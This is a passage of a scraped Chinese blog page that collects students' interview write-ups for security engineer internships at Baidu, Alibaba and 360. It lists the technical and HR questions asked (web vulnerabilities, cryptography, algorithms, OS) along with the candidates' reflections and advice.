class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line">date: 2017-05-03</span><br><span class="line">author: 彦修</span><br><span class="line">company: 百度</span><br><span class="line">season: 2016 春招</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"># 2016春招百度面经</span><br><span class="line"></span><br><span class="line">请移步 http://bbc1af36.wiz03.com/share/s/2XMqYS0wfA4F2OaJNd0HhnI83-OEbJ2mhkhD2_5_bJ0RToCm  </span><br><span class="line">请移步 http://bbc1af36.wiz03.com/share/s/2XMqYS0wfA4F2OaJNd0HhnI83-OEbJ2mhkhD2_5_bJ0RToCm  </span><br><span class="line">请移步 http://bbc1af36.wiz03.com/share/s/2XMqYS0wfA4F2OaJNd0HhnI83-OEbJ2mhkhD2_5_bJ0RToCm</span><br><span class="line"></span><br><span class="line">以下仅为防止源站失效而留下的备份, 请访问上面的原文链接  </span><br><span class="line">以下仅为防止源站失效而留下的备份, 请访问上面的原文链接  </span><br><span class="line">以下仅为防止源站失效而留下的备份, 请访问上面的原文链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 百度安全工程师一面总结</span><br><span class="line"></span><br><span class="line">### 0x01 自己问题</span><br><span class="line"></span><br><span class="line">面试官还是很和蔼的，之前一直很紧张，开始聊之后心情好多了。问到了项目经历，其实感觉自己对自己做过的项目已经很了解了，结果还是被问到的很多都不是很清楚。哎。。心塞！</span><br><span class="line"></span><br><span class="line">首先第一个问题就是自己“基于机器学习的垃圾短信检测系统”选用的机器学习算法。为什么选用这个算法。跟其他算法比较有什么优势。差点问懵了。当时自己选用贝叶斯算法的时候确实没有做过多的比较，只是和神经网络算法比较了下。就选定了，这是典型的知其然，不知其所以然。这让我想起来自己之前知乎看到的一个关于java三大框架的问题，你在学框架之前首先需要知道没有框架人们是怎么做的，框架做了什么，然后你就知道为什么用框架了，也就明白框架的特性了。现在深以为然。</span><br><span class="line"></span><br><span class="line">第二个问题，就是关于自己整个样本选择和测试的问题。其中暴露的问题也很多啊，不规范是最大的问题。细节决定成败啊。</span><br><span class="line"></span><br><span class="line">第三个问题自己写的识别率太高。面试官说百度，阿里也在做这一块，但是他们都不敢说识别率有这么高。顿时有点小尴尬。原因又回到之前第二个问题了，样本选择和测试不规范。</span><br><span class="line"></span><br><span class="line">### 0x02 共性问题</span><br><span class="line"></span><br><span class="line">#### 2.1 算法问题</span><br><span class="line"></span><br><span class="line">问题：给一段有序数组，然后给一个数字K（K未知），然后将k及其k之前的数字挪到数组之后，现在考虑时间复杂度和空间复杂度找到最小数字的下标。</span><br><span class="line"></span><br><span class="line">答案：第一种：遍历（面试官说这个就不用说了，笑！）；</span><br><span class="line"></span><br><span class="line">第二种：分段方法;</span><br><span class="line"></span><br><span class="line">自己在情急之下也就想到了这种算法，取一个数组的第一个、中间一个，以及最后一个数字，判定其大小。那么有三种情况。</span><br><span class="line"></span><br><span class="line">第一种，如果k=0，那么三个数字之间属于递增  </span><br><span class="line">第二种，如果k不大于数组长度的一半，三个数字之间分别是中，大，小。那么k的值可以确定为0&lt;k&lt;(length/2)+1;  </span><br><span class="line">第三种，如果k大于数组长度的一半，三个数字之间分别是大，小，中。那么K的值可以确定为(length/2)&lt;k&lt;length+1;</span><br><span class="line"></span><br><span class="line">#### 2.2 数据结构</span><br><span class="line"></span><br><span class="line">给一段后序和中序遍历，给出先序遍历，结果没找到笔，面试官说换一道题吧！也是醉了。</span><br><span class="line"></span><br><span class="line">#### 2.3 linux shell</span><br><span class="line"></span><br><span class="line">有是个名字是“baidu_”的进程，编写脚本kill掉，这个真心不会。哎，早知道自己渣渣shell水平就不该写。</span><br><span class="line"></span><br><span class="line">#### 2.4 操作系统</span><br><span class="line"></span><br><span class="line">##### （1）死锁以及为什么发生死锁，解除死锁。</span><br><span class="line"></span><br><span class="line">操作系统差不多都忘完了，所幸这个还记着一点。回答的不是很好，但是大概讲清楚了。</span><br><span class="line"></span><br><span class="line">##### （2）进程之间通信方式</span><br><span class="line"></span><br><span class="line">信箱，管道，消息（忘记说这个了），共享存储区。</span><br><span class="line"></span><br><span class="line">### 0x03 总结</span><br><span class="line"></span><br><span class="line">总之百度一面知识都是很基础，而且面试官也说了，一面考察基础。之后的才是安全。感觉自己答的还可以，但不是很好。最后真的想问下面试官能不能进二面，感觉不太礼貌。所以没问。希望可以通过吧。加油↖(^ω^)↗。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 百度安全工程师二面总结</span><br><span class="line"></span><br><span class="line">### 0x00 前言</span><br><span class="line"></span><br><span class="line">昨天上午面完一面之后，下午就收到了二面通知，但是当时比较急。所以只好推到了今天上午，又是一次洗礼。虽然只有两面，但是还是感觉到了一点面试的小诀窍。比如都是问项目，比如都是问一些比较基础的知识。</span><br><span class="line"></span><br><span class="line">### 0x01 自己问题</span><br><span class="line"></span><br><span class="line">依然是聊项目，发现其实只要有项目一般情况下都是聊项目问题。先是第一个项目。</span><br><span class="line"></span><br><span class="line">这部分其实略过不表了，因为大部分问的都是项目细节。主要目的是验证这项目是不是你的啊，另外因为这项目是纯开发的，跟安全关系不大，面试官也不想问，本来不想写，但是我觉得安全也得有开发啊，真是的！（我也是这么跟面试官说的，认真脸）</span><br><span class="line"></span><br><span class="line">我发现每次面试官都能找到新的点来问。虽然同样是“基于机器学习的垃圾短信检测”项目，但是昨天和今天问的问题就几乎不一样。我也是醉了，一个项目竟然有这么多点可以挖掘。现在回忆下问题吧。</span><br><span class="line"></span><br><span class="line">恶意网站识别用的什么技术？识别率怎么样？  </span><br><span class="line">你当时机器学习算法还选用了什么算法，为什么当时选择贝叶斯算法？  </span><br><span class="line">贝叶斯算法和朴素贝叶斯算法有什么区别？（没回答上来，感觉好是尴尬）  </span><br><span class="line">你这个项目做什么的？你在其中具体做什么的？（滔滔不绝说了十分钟，估计面试官听累了）  </span><br><span class="line">为什么目标选择淫秽色情和赌博类网站？  </span><br><span class="line">如果一个网站是纯图片，怎么识别这个网站的安全性？（当时想到用OCR识别，但是想不到其他的了，知道的麻烦讲下）</span><br><span class="line"></span><br><span class="line">### 0x02 共性问题</span><br><span class="line"></span><br><span class="line">你怎么理解sql注入？  </span><br><span class="line">你怎么理解xss攻击？  </span><br><span class="line">你怎么理解csrf？  </span><br><span class="line">你对病毒了解的怎么样？问完这个问题，我又滔滔不绝说了两三分钟，面试官说我不听感染机制和原理，问我怎么分析这个病毒的，我说获取了源代码。他说如果没有源代码，你会逆向吗？我说没接触过，他说好的，那就这样吧！这样吧！这样！吧！不过最后补充一句说，注意后续的通知。（难道我这是有戏么？傅园慧逗逼脸。。。。）</span><br><span class="line"></span><br><span class="line">### 0x03 总结</span><br><span class="line"></span><br><span class="line">每次面试期间都是口干舌燥，估计是有点紧张，其实今天总体感觉不是很好，说白了就是还不如昨天。就这样吧，洗洗涮涮睡一会，醒来去见女朋友！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 百度安全工程师终极面总结</span><br><span class="line"></span><br><span class="line">期盼了两天，算是完成了最后的面试。面试完之后心里一直很不平静。</span><br><span class="line"></span><br><span class="line">首先和三面面试官聊得时间很短，当然这是相对前两面试官来说的。在这短短的时间之内，自己回答的也不是很好，面试官问的问题：你在项目中遇到的最大的困难是什么？当时感觉自己状态不是很好，瞬间有点懵。说了一些项目当中遇到的问题，但是个人感觉这些问题真的都很简单，没有一点代表性。面试官也说希望我说一些代表性的问题，能够看出来我的性格和能力还有想法的。怎么讲呢？对于这种抽象的问题自己准备不足。另外就是可能最后一面有点紧张。困难实际上真的是有的，只是不知道为什么当时的情景下自己想不起来。</span><br><span class="line"></span><br><span class="line">最后面试官说没什么可以问的了，问我有什么想说的。我说自己代码还好，直接走开发也是可以的。面试官说那你给我看下你代码，把你写的最好的发过来。这是自己第二个失败的地方。自己硬盘在一个月前down掉了，结果什么都没有剩下。想解释但是又感觉说出来未免不可信。挂完电话只好将自己前段时间写的挺烂的代码发过去。事后想想这是第三个败笔。其实可以跟面试官说，给我制定需求，我在指定时间之内去实现提出的需求，但是自己没有讲。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 写在最后</span><br><span class="line">总的来说百度三面的问题很多，好多自己真实的情况都没有展示给面试官。权当是个教训吧。希望以后自己再这些地方不再入坑，有些事情真的是一念之间。</span><br><span class="line"></span><br><span class="line">**关注原理的解读**</span><br><span class="line"></span><br><span class="line">**lc4t大二春招时投递了部分企业, 面试题目整理**</span><br><span class="line"></span><br><span class="line">### ali 春招内推电话1面</span><br><span class="line"></span><br><span class="line"> - 对web安全的理解</span><br><span class="line"> - 熟悉的漏洞+防范</span><br><span class="line"> - udf提权</span><br><span class="line"> - xssfuzzing</span><br><span class="line"> - xss/csrf/sqli防范</span><br><span class="line"> - mysql有哪些表</span><br><span class="line"> - 如何日掉一个网站/思路</span><br><span class="line"> - 如何代码审计</span><br><span class="line"> - HTML5新安全策略</span><br><span class="line"> - 自己找到过的代码审计问题</span><br><span class="line"></span><br><span class="line">### baidu@邮箱投递电话1面</span><br><span class="line"> - 如何做扫描器 思路</span><br><span class="line"> - 创宇wooyun的扫描器原理</span><br><span class="line"> - 扫描器为什么要这么设计</span><br><span class="line"> - 企业安全应急响应 如何获取指纹</span><br><span class="line"> - 如何获取大量指纹信息</span><br><span class="line"> - sql注入类型</span><br><span class="line"> - sql注入点寻找思路</span><br><span class="line"> - sql如何报错</span><br><span class="line"> - 宽字节注入原理/在哪里编码/如何防范</span><br><span class="line"> - sql里面只有update怎么利用</span><br><span class="line"> - mysql和sqlserver注入时候的区别</span><br><span class="line"> - dom xss 原理/防范</span><br><span class="line"> - 存储型xss原理</span><br><span class="line"> - xss防范</span><br><span class="line"> - xss过滤放在输入还是输出好</span><br><span class="line"> - 如何快速发现xss位置</span><br><span class="line"> - 如何绕过http only</span><br><span class="line"> - xss worm原理</span><br><span class="line"> - 如何保护dom不被修改 防止dom xss</span><br><span class="line"> - sql注入思路，首先测试什么</span><br><span class="line"> - sql如何写shell/单引号被过滤怎么办</span><br><span class="line"> - 同源策略</span><br><span class="line"> - html5安全/websocket</span><br><span class="line"> - cookie参数，security干什么的</span><br><span class="line"> - 平时用什么语言开发</span><br><span class="line"> - 写过什么项目</span><br><span class="line"></span><br><span class="line">### 360 实验室单招投递电面</span><br><span class="line"> - 写过什么项目，什么功能</span><br><span class="line"> - xss http only如何获取cookie</span><br><span class="line"> - xss还能干什么</span><br><span class="line"> - 只有后台如何渗透</span><br><span class="line"> - 渗透一般思路</span><br><span class="line"> - 如何社工一个企业的员工信息</span><br><span class="line"> - csrf 如何不带referer访问</span><br><span class="line"> - 如何获得一个域名的邮箱列表</span><br><span class="line"> - 如何知道waf信息</span><br><span class="line"> - 如何收集子域名</span><br><span class="line"> - 1521是什么端口</span><br><span class="line"> - 用什么扫描器</span><br><span class="line"> - mysql4,5的区别</span><br><span class="line"> - mysql提权方式</span><br><span class="line"> - mysql udf提权 目录位置</span><br><span class="line"></span><br><span class="line">### baidu@二面 重点：基本漏洞原理防御</span><br><span class="line"> - 介绍</span><br><span class="line"> - 学习了多久web安全 学了啥</span><br><span class="line"> - （就介绍内容提问，系统观）</span><br><span class="line"> - webserver最重要的是什么/流程</span><br><span class="line"> - 熟悉的语言 写过什么</span><br><span class="line"> - 最熟悉的漏洞 原理 防范</span><br><span class="line"> - xss/sql/原理防范，利用方式，能用来干啥</span><br><span class="line"> - csrf如何不带referer 如何防范</span><br><span class="line"> - xss绕过同源策略/获取另外网站的/子站的</span><br><span class="line"> - 同源策略 是什么 why</span><br><span class="line"> - 给写php的人安全建议</span><br><span class="line"> - php非安全的函数</span><br><span class="line"> - ddos原理</span><br><span class="line"> - 反射原理</span><br><span class="line"> - dns协议在哪一层 什么时候用tcp</span><br><span class="line"> - 网络协议脆弱性了解</span><br><span class="line"> - tcp/udp区别 如何做可靠性连接 why</span><br><span class="line"> - tcp可不可以反射dns做ddos</span><br><span class="line"> - 漏洞挖掘经验</span><br><span class="line"> - 代码审计经验</span><br><span class="line"> - 漏洞深入研究经验</span><br><span class="line"> - 实习能来多久（小于3个月似乎不要？）</span><br><span class="line"> - 实习的话想干什么</span><br><span class="line"> - 有什么没问到的方面</span><br><span class="line"> - 扯到的：百度xss防范机制/大网站子站安全性</span><br><span class="line"></span><br><span class="line"> # 阿里面经</span><br><span class="line"></span><br><span class="line"> @ s1y1  集团安全部-数据安全方向-安全工程师-5面技术+hr面</span><br><span class="line"> &gt; 时间有点久了，就把我记得的简单写一下，希望会留下点帮助。（本来还担心写不了多长，看到MiCigo的辣么短我就放心了:)</span><br><span class="line"></span><br><span class="line"> ### 0x00 内推&amp;测评</span><br><span class="line"> 阿里的实习生招聘消息最早是在公众号（阿里巴巴招聘）上看到的，至于为什么会有这个公众号，大概是很久以前定的一个flag吧。然后就找在阿里的校友师姐帮我内推了，做好简历发给她，然后收到链接、完善简历、完成线上测评（智力题？。</span><br><span class="line"></span><br><span class="line"> 要说一点的是简历部分，如果简历上奖项和项目实在太多（比如我 :)</span><br><span class="line"> 一定要学会取舍，删去和安全无关的小奖，重点介绍和你想申请的岗位方向（方向会贴心的让你选择）有关的项目和学习经历，不过英语数学方面的奖是加分项，可以适当保留。</span><br><span class="line"> ### 0x01 一面 简历评估 45min</span><br><span class="line"> 当我做完测评的第二天就接到了一面电话，处于什么都没准备的状态，还好实验室晚上没人，比较安静。就全程凭借知识积累与一颗平常心回答了各种问题——</span><br><span class="line"> 一面应该是比较简单的简历评估，无非是按照简历问问基础知识和项目经历。由于我的方向是数据安全，做过和密码应用相关的几个项目，所以被问到的问题和大多数大佬们的不太一样，记得的有：</span><br><span class="line"> - 分组密码的加密模式</span><br><span class="line"> - 初始向量IV的作用</span><br><span class="line"> - AES／DES的具体工作步骤</span><br><span class="line"> - 沙盒是什么有什么作用</span><br><span class="line"> - 简单介绍下MAC消息认证码</span><br><span class="line"> - XSS、SQL的防御措施</span><br><span class="line"> - 算法问题：Dijkstra算法思路（迷醉</span><br><span class="line"></span><br><span class="line"> 除了这些还简单问了下项目经历和竞赛经历，然后看到我参加的英语竞赛和英语写作之星竞赛，就问了下我的英语水平，应该还算满意。</span><br><span class="line"></span><br><span class="line"> 换我问他问题的时候，我看了一眼钟，已经快9点了，毫不犹豫地问他你怎么还不下班（严肃脸），然后他表示五点半就可以走了，不强制加班 ( ᵒ̶̷̤́ ౪  ᵒ̴̶̷̤̀ )／～</span><br><span class="line"></span><br><span class="line"> ### 0x02 技术主管面 60分钟</span><br><span class="line"> 没有像一面一样问太多基础知识，从自我介绍开始就不停地暂停我，追问各种经历的细节，比较具体的问了我的三个项目，每个项目都希望我能把模型、实现的协议、算法讲的让他完全理解。不仅如此，他还对其中一个还表示怀疑，我解释了挺久发现他提出的问题确实存在，只是我们当时做的时候默认这种情况不存在，受教了Orz...</span><br><span class="line"></span><br><span class="line"> 关于竞赛和刷题的细节问题也问了挺多，类似：</span><br><span class="line"> - 数模网络流量那题建了什么模型，怎么改进的算法？用什么语言实现的？用了哪些库？</span><br><span class="line"> - 看到我有Coursera证书，就具体问了课程上的某道题怎么解决的？</span><br><span class="line"> - 又问了两道Crypto-Hackthon的题目。（这些都是简历中有提到的</span><br><span class="line"> - 抓包分析使用IPSec前后看到的包内容有什么不同？顺带问了下各层协议包的构成。</span><br><span class="line"></span><br><span class="line"> 所以二面之前最好回顾一下之前做过的所有东西，尤其是一些创新点、花了时间和精力解决的点（相信你也忘不了），事先回忆过一遍这些，在面试官提问时就可以尽快在大脑中搜索提取。</span><br><span class="line"></span><br><span class="line"> ### 0x03 交叉面 30分钟</span><br><span class="line"></span><br><span class="line"> 在二面过了一个星期后接到了预约三面的电话，居然告诉我是一个身在西雅图的巨巨想跟我聊聊，瑟瑟发抖，保持清醒确认了一下是用中文，长吁一口气，便把二面中觉得自己回答的不够好的问题准备了一下，准备第二天大早上爬起来接受跨洋面试（因为有时差 要早起= =）</span><br><span class="line"></span><br><span class="line"> 由于hr小姐姐和我自己的疏忽导致算错了时差，在多等了一个小时后，非常“准时”地接到了电话。</span><br><span class="line"></span><br><span class="line"> 大佬很和蔼，一上来就做了他的自我介绍，并告诉我他是负责阿里云的，所以我就把三面算作交叉面吧。同样聊了聊项目（所以项目经历很重要！）问了问我具体负责的部分，使用的算法以及为什么考虑用它们、安全性分析等等。然后他说前两面对我基础知识掌握情况的评价非常高就不再多问了，然后，开始和我聊人生！～ 至今都很感谢这位面试官给我在实习和上研方向上的指点与建议。</span><br><span class="line"></span><br><span class="line"> ### 0x04 继续技术？群面 10+3分钟</span><br><span class="line"> 一开始接到这个电话我以为该hr面了，没想到他**们**（对！对面不止一位面试官）说再加一轮技术面，这一面比较短，比较具体地了解了我之前做过的一个模型，还问了我擅长用什么语言处理这类问题，然后介绍了他们要着手做的一个case，问我有什么想法，我按照以前的经验，提出了一个简单的思路，他们觉得可以，然后就问了问我实习的时间，简单聊了几句后就挂了电话。</span><br><span class="line"></span><br><span class="line"> 5分钟后，他们又打来了电话。。问我大四有没有什么事情，我说我想保研，他们也表示支持，没多说什么就挂了电话。</span><br><span class="line"></span><br><span class="line"> ### 0x05 总监面 20分钟</span><br><span class="line"> 我也不知道为什么又多出来了这个总监面，而且这一面在四面结束的第二天晚上，我正在外面吃饭，便推到了晚上再面，我本来以为这是hr面，还紧急向群里求助hr都会问什么问题。</span><br><span class="line"></span><br><span class="line"> 结果还是技术面，而且就是现在的部门总监面的。一样又把项目具体地和老大描述了一遍，他觉得很有意思、想法不错，同时提醒我，真正实习时遇到的问题会比想象中困难，要做好准备接受挑战，然后和我介绍了他们要做的事情问我有没有兴趣，当然有兴趣！总监的时间也比较宝贵，于是就比较简短地结束了最后一轮技术面。</span><br><span class="line"></span><br><span class="line"> ### 0x06 hr面 20分钟</span><br><span class="line"> 经历了5轮技术面后，在真正的hr面到来时我已经看开了，小姐姐问了很多很抽象的问题，凭着感觉表达真实的自己就好，记得的问题有：</span><br><span class="line"></span><br><span class="line"> - 怎么平衡学业与竞赛</span><br><span class="line"> - 用三个形容词形容自己</span><br><span class="line"> - 作为女生，是什么支撑着你走技术这条路</span><br><span class="line"> - 介绍下印象最深的一段学习经历</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ---</span><br><span class="line"></span><br><span class="line"> 收到阿里的Offer算是一个圆梦，不过这只是一个新的开始。立好下一个flag，做一个充实的海绵吧，共勉。</span><br><span class="line"></span><br><span class="line"> 很高兴在群里结识各位大佬，以后在工作生活中有安全其他方向上的问题也会向各位请教，谢谢大家了，同时我也会更加努力学习进步～</span><br><span class="line"></span><br><span class="line"> 原文链接 https://www.zhihu.com/question/56263411/answer/157831937 无节操全文复制过来了  </span><br><span class="line"> 八面大佬...  </span><br><span class="line"> 匿名的(233不过我认识, 能认识这样的大佬真是荣幸)</span><br><span class="line"></span><br><span class="line"> -----------------------</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>答^(*￣(oo)￣)^信息：大三，安全工程师，bin，集团安全部。</p><p>最近看到有几个群在发我这个回答的截图=。=让我很懵逼，特地来解释一番。<br>首先为什么我面了这么多轮，这个问题我也费解了很久…后得知，是前面的面试评价让HR无法判定我适合去哪个部门，所以后面让不同部门的大佬和我聊了一下。就这么简单…万幸最后给我分配到的部门和工作是我第一意向，除了多了一部分以前完全没干过的内容（正在恶补ing）。还是很感谢面试官大哥们对我的提点以及HR姐姐的负责：）<br>要知道面了这么多轮我也是心神憔悴啊…写这个回答是希望能给之后的学弟学妹们留一个面经，比较懒还没详细写，看这个情况还是不取消匿名了=。=<br>总结下我阿里的面试，虽然面的是安全工程师-Bin方向，但是后半程基本围绕：编程，算法数据结构，操作系统，编译原理，内核展开了。希望学弟学妹们在提升自己安全技术同时，不要忽略这些基础知识，加油啦！</p><p>以下是原答案<br>=============分割线=================<br>2017-3-3 投递简历<br>2017-3-15 一面 简历评估面<br>2017-3-16 二面 漏洞挖掘<br>2017-3-16 三面 内核攻防<br>2017-3-22 四面 交叉面<br>2017-4-5 五面 大佬，超级大佬，全线碾压，认真聆听前辈教诲<br>2017-4-5 六面 大老板，谈人生谈理想，部门介绍<br>2017-4-7 七面 又一位大佬，聊得很愉快<br>2017-4-13 HR面 HR姐姐感冒了，加班很辛苦，手动送上一杯热水<br>2017-4-14 周五晚七点多正在上课，突然收到录取短信 + 邮件，开心的像个傻孩子：）</p><p>周末和父母、学长还有导师聊了许久。多方权衡，最终在阿里和鹅厂之间选择了阿里。<br>祝福还在焦急等待的童鞋们早日拿到offer，和大佬们在杭州面基啊！！！<br>暂时匿名</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span 